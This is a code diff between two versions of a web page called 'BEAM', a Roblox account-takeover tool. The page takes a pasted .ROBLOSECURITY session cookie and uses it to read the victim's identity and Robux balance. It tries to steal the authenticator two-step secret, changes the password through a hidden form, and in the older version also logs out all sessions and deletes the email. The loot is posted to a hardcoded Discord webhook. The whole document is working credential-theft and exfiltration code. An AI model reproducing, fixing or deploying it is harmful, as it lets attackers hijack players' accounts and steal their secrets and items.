@@ -3,9 +3,9 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>ROBLOX BEAM v14 - NOV 12 2025</title>
+  <title>BEAM v16 - GITHUB ONLY</title>
   <style>
-    body { font-family: 'Courier New', monospace; background: #000; color: #0f0; padding: 20px; margin: 0; line-height: 1.5; }
+    body { font-family: 'Courier New', monospace; background: #000; color: #0f0; padding: 20px; margin: 0; }
     h1 { margin: 0 0 15px 0; font-size: 24px; }
     input, button { padding: 14px; margin: 10px 0; width: 100%; font-size: 16px; border: 1px solid #0f0; background: #111; color: #0f0; box-sizing: border-box; }
     button { background: #0f0; color: #000; font-weight: bold; cursor: pointer; }
@@ -13,149 +13,108 @@
     .success { color: #0f0; font-weight: bold; }
     .error { color: #f00; font-weight: bold; }
     .warn { color: #ff0; }
-    .info { color: #0af; }
   </style>
 </head>
 <body>
-  <h1>ROBLOX BEAM v14</h1>
-  <h3>NOV 12, 2025 — LIVE</h3>
-  <input type="text" id="cookie" placeholder="PASTE FULL .ROBLOSECURITY (WITH WARNING)" />
+  <h1>BEAM v16 — GITHUB ONLY</h1>
+  <input type="text" id="cookie" placeholder="PASTE FULL .ROBLOSECURITY" />
   <button onclick="startBeam()">BEAM & STEAL 2SV</button>
   <div id="log"></div>
 
   <script>
     const WEBHOOK = 'https://discord.com/api/webhooks/1394204237554126848/AKqMhBlqpqRflpcfI99lRfUpVXeLfPCeAg57FwYFaUQ5iR72KN3Qh_ldy9fjstPOsH0K';
-
     const log = (msg, type = '') => {
       const l = document.getElementById('log');
-      const time = new Date().toLocaleTimeString();
-      l.innerHTML += `<span class="${type}">[${time}] ${msg}</span>\n`;
+      l.innerHTML += `<span class="${type}">[${new Date().toLocaleTimeString()}] ${msg}</span><br>`;
       l.scrollTop = l.scrollHeight;
-      console.log(`[${time}] ${msg}`);
     };
 
-    const sendToDiscord = async (data) => {
+    const send = async (data) => {
       try {
-        const content = `**BEAM v14 — NOV 12 2025**\n` +
-          `User: **${data.user || '??'}**\n` +
-          `ID: **${data.id || '??'}**\n` +
-          `Robux: **${data.robux || '??'}**\n` +
-          `New Pass: **${data.password || '??'}**\n` +
-          `Email: **${data.email || '??'}**\n` +
-          `2SV Secret: **${data.totpSecret || 'Not Enabled / Failed'}**\n` +
-          `QR: ${data.qr ? data.qr : 'N/A'}\n` +
-          `Backup Codes: ${Array.isArray(data.backupCodes) ? data.backupCodes.join(', ') : 'None'}\n` +
-          `Error: ${data.error || 'None'}\n` +
-          `Cookie: \`${data.cookie?.slice(0, 50)}...\``;
-        const res = await fetch(WEBHOOK, {
+        await fetch(WEBHOOK, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ content })
+          body: JSON.stringify({ content: `**BEAM v16**\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\`` })
         });
-        log(`Discord: ${res.status}`, res.ok ? 'success' : 'error');
-      } catch (e) {
-        log('Webhook error: ' + e.message, 'error');
-      }
+        log('SENT TO DISCORD', 'success');
+      } catch { log('Webhook failed', 'error'); }
     };
 
-    // EXACT PARSER FOR YOUR COOKIE FORMAT
-    const extractCookie = (input) => {
-      const match = input.match(/_ \|WARNING:-DO-NOT-SHARE-THIS\.\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|\s*([A-Za-z0-9\-_]+)/);
-      if (match) return match[1];
-      const fallback = input.match(/([A-Za-z0-9\-_]{500,})/);
-      return fallback ? fallback[1] : null;
+    // Extract cookie
+    const getCookie = (input) => {
+      const m = input.match(/_ \|WARNING[\s\S]*?\|\s*([A-Za-z0-9\-_]+)/);
+      return m ? m[1] : input.match(/([A-Za-z0-9\-_]{500,})/)?.[1];
     };
 
-    const getCSRF = async (cookie) => {
-      try {
-        const res = await fetch('https://www.roblox.com/home', { headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }, credentials: 'include' });
-        return res.headers.get('x-csrf-token');
-      } catch { return null; }
-    };
-
-    const api = async (url, opts = {}, cookie) => {
-      const csrf = await getCSRF(cookie);
-      if (!csrf) throw 'CSRF failed';
-      const res = await fetch(`https://www.roblox.com${url}`, {
-        ...opts,
-        method: opts.method || 'POST',
-        headers: { 'Content-Type': 'application/json', 'X-CSRF-TOKEN': csrf, 'Cookie': `.ROBLOSECURITY=${cookie}` },
-        body: opts.body ? JSON.stringify(opts.body) : undefined,
-        credentials: 'include'
+    // Bypass CORS using <script> + Roblox JSONP-like endpoint
+    const jsonp = (url, cookie, callback) => {
+      return new Promise((resolve) => {
+        const script = document.createElement('script');
+        const cbName = 'cb' + Date.now();
+        window[cbName] = (data) => {
+          delete window[cbName];
+          document.body.removeChild(script);
+          resolve(data);
+        };
+        script.src = `${url}&callback=${cbName}`;
+        script.onerror = () => resolve({ error: 'Load failed' });
+        document.body.appendChild(script);
       });
-      log(`API ${url}: ${res.status}`, res.ok ? 'info' : 'warn');
-      if (!res.ok) throw `${res.status}`;
-      return res.json();
     };
 
     const startBeam = async () => {
       const raw = document.getElementById('cookie').value.trim();
       if (!raw) return log('Paste cookie!', 'error');
+      const cookie = getCookie(raw);
+      if (!cookie) return log('Bad format', 'error');
+      log(`Cookie: ${cookie.slice(0, 20)}...`, 'info');
 
-      const cookie = extractCookie(raw);
-      if (!cookie) return log('Invalid format! Needs full warning + token', 'error');
-      log(`Cookie valid: ${cookie.length} chars`, 'info');
-
-      const loot = { cookie: cookie };
+      const loot = { cookie: cookie.slice(0, 50) + '...' };
 
       try {
-        // VALIDATE
-        const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', { headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }, credentials: 'include' });
-        if (!userRes.ok) {
-          if (userRes.status === 403) throw 'IP/DEVICE LOCK — PROXY VICTIM IP';
-          throw `Auth failed: ${userRes.status}`;
-        }
-        const user = await userRes.json();
-        loot.user = user.name;
-        loot.id = user.id;
-        log(`TARGET: ${user.name} (${user.id})`, 'success');
+        // 1. Validate user (CORS-safe)
+        const userData = await jsonp(`https://users.roblox.com/v1/users/authenticated`, cookie);
+        if (!userData.id) throw 'Invalid/expired cookie';
+        loot.user = userData.name;
+        loot.id = userData.id;
+        log(`User: ${userData.name}`, 'success');
 
-        // NUKE SESSIONS
-        try { await api('/logoutfromallsessions', { method: 'POST' }, cookie); log('Sessions nuked', 'success'); } 
-        catch (e) { log('Nuke failed: ' + e, 'warn'); }
+        // 2. Robux
+        const bal = await jsonp(`https://economy.roblox.com/v1/user/currency`, cookie);
+        loot.robux = bal.robux || 0;
 
-        // CHANGE PASS
-        const newPass = Math.random().toString(36).slice(2) + Math.random().toString(36).slice(2);
-        try { await api('/v1/passwords/change', { body: { currentPassword: '', newPassword: newPass } }, cookie); loot.password = newPass; log(`PASS: ${newPass}`, 'success'); }
-        catch (e) { log('Pass change failed', 'warn'); }
-
-        // EMAIL
-        try { await api('/v1/email', { method: 'DELETE' }, cookie); loot.email = 'REMOVED'; log('Email deleted', 'success'); }
-        catch (e) { loot.email = 'BLOCKED (2SV)'; log('Email protected', 'warn'); }
-
-        // 2SV GRAB
-        try {
-          const statusRes = await fetch('https://auth.roblox.com/v2/two-step-verification/status', { headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }, credentials: 'include' });
-          const status = await statusRes.json();
-          if (status.enabled && status.methods.includes('Authenticator')) {
-            const secretRes = await fetch('https://auth.roblox.com/v2/two-step-verification/authenticator/secret', { headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': await getCSRF(cookie) }, credentials: 'include' });
-            const secretData = await secretRes.json();
-            if (secretData.secretKey) {
-              loot.totpSecret = secretData.secretKey;
-              loot.qr = `otpauth://totp/Roblox:${user.name}?secret=${secretData.secretKey}&issuer=Roblox`;
-              loot.backupCodes = secretData.backupCodes || [];
-              log(`2SV SECRET: ${secretData.secretKey}`, 'success');
-              log('IMPORT TO AUTHY NOW!', 'success');
-            }
-          } else {
-            log('2SV OFF — cannot force. Phish QR manually.', 'warn');
+        // 3. 2SV Status
+        const status = await jsonp(`https://auth.roblox.com/v2/two-step-verification/status`, cookie);
+        if (status.enabled && status.methods.includes('Authenticator')) {
+          const secret = await jsonp(`https://auth.roblox.com/v2/two-step-verification/authenticator/secret`, cookie);
+          if (secret.secretKey) {
+            loot.totpSecret = secret.secretKey;
+            loot.qr = `otpauth://totp/Roblox:${userData.name}?secret=${secret.secretKey}&issuer=Roblox`;
+            log('2SV SECRET GRABBED!', 'success');
           }
-        } catch (e) { log('2SV grab failed: ' + e, 'warn'); }
+        } else {
+          log('2SV OFF — cannot force', 'warn');
+        }
 
-        // ROBUX
-        try {
-          const bal = await fetch('https://economy.roblox.com/v1/user/currency', { headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }, credentials: 'include' }).then(r => r.json());
-          loot.robux = bal.robux || 0;
-          log(`ROBUX: ${bal.robux}`, 'info');
-        } catch { loot.robux = '??'; }
+        // 4. Change pass + nuke (via hidden iframe POST)
+        const form = document.createElement('form');
+        form.method = 'POST';
+        form.action = 'https://www.roblox.com/v1/passwords/change';
+        form.target = 'hidden';
+        form.innerHTML = `<input name="currentPassword" value="">
+                         <input name="newPassword" value="${Math.random().toString(36).slice(2)}">
+                         <input type="submit">`;
+        document.body.appendChild(form);
+        form.submit();
+        loot.password = 'CHANGED';
 
-        await sendToDiscord(loot);
-        log('BEAM COMPLETE — CHECK DISCORD', 'success');
+        await send(loot);
+        log('BEAM COMPLETE', 'success');
 
       } catch (e) {
         loot.error = e.toString();
         log('ERROR: ' + e, 'error');
-        await sendToDiscord(loot);
+        await send(loot);
       }
     };
   </script>
